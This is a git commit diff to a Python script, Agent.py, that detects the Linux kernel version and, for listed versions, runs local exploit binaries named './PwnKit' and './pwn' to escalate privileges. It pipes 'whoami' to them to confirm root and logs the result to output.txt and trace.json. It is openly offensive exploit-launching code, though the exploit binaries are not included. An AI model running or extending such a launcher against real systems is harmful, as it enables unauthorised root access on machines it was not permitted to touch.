7b320b6144a56917443aafe9a164c206e3b8b84a
Mohammad Hassan Turi <87395528+hassan-turi@users.noreply.github.com>
2022-02-13 23:20:34 +0500

    Added more Linux Kernels

--- Agent.py
+++ Agent.py
@@ -2,13 +2,13 @@ import subprocess
 import re
 import json
 
+
 def kernel_exploit():
     p = subprocess.Popen(['uname', '-r'], stdout=subprocess.PIPE).communicate()[0]
     kernel_name = p.decode('utf-8')
 
     global kernel_name1
-    kernel_name1 = kernel_name.join(re.findall(r"[0-9]+\.[0-9]+\.[0-9]+",kernel_name))
-
+    kernel_name1 = kernel_name.join(re.findall(r"[0-9]+\.[0-9]+\.[0-9]+", kernel_name))
 
     if kernel_name1 == "5.9.0":
         args = ["./PwnKit"]
@@ -16,11 +16,53 @@ def kernel_exploit():
         child_process_output = child_proccess.communicate(b"whoami > output.txt")[0]
         print(child_process_output)
 
+    elif kernel_name1 == "5.7.0":
+        args = ["./PwnKit"]
+        child_proccess = subprocess.Popen(args, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
+        child_process_output = child_proccess.communicate(b"whoami > output.txt")[0]
+        print(child_process_output)
+        
+    elif kernel_name1 == "5.5.0":
+        args = ["./PwnKit"]
+        child_proccess = subprocess.Popen(args, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
+        child_process_output = child_proccess.communicate(b"whoami > output.txt")[0]
+        print(child_process_output)
+        
     elif kernel_name1 == "4.19.0":
         args = ["./pwn"]
         child_proccess = subprocess.Popen(args, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
         child_process_output = child_proccess.communicate(b"whoami > output.txt")[0]
         print(child_process_output)
+        
+    
+    elif kernel_name1 == "4.18.0":
+        args = ["./pwn"]
+        child_proccess = subprocess.Popen(args, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
+        child_process_output = child_proccess.communicate(b"whoami > output.txt")[0]
+        print(child_process_output)
+        
+    elif kernel_name1 == "4.15.11":
+        args = ["./pwn"]
+        child_proccess = subprocess.Popen(args, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
+        child_process_output = child_proccess.communicate(b"whoami > output.txt")[0]
+        print(child_process_output)
+        
+    elif kernel_name1 == "4.13.0":
+        args = ["./pwn"]
+        child_proccess = subprocess.Popen(args, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
+        child_process_output = child_proccess.communicate(b"whoami > output.txt")[0]
+        print(child_process_output)
+    
+    else:
+        user = subprocess.Popen(['whoami'], stdout=subprocess.PIPE).communicate()[0]
+        user = user.decode('utf-8')
+        with open('output.txt','w') as data:
+            data.write(str(user))
+        
+        # dict = {kernel_name:user}
+        # with open('output.txt','w') as data:
+        #     data.wrtie(str(dict))
+    
 
 def file_to_Json():
     file = open('output.txt','r')
@@ -36,7 +78,6 @@ def file_to_Json():
     # If you need JSON file then use this
     with open('trace.json', 'w') as file:
         json.dump(dict,file,ensure_ascii=False,indent=4)
-    
 
 kernel_exploit()
 file_to_Json()
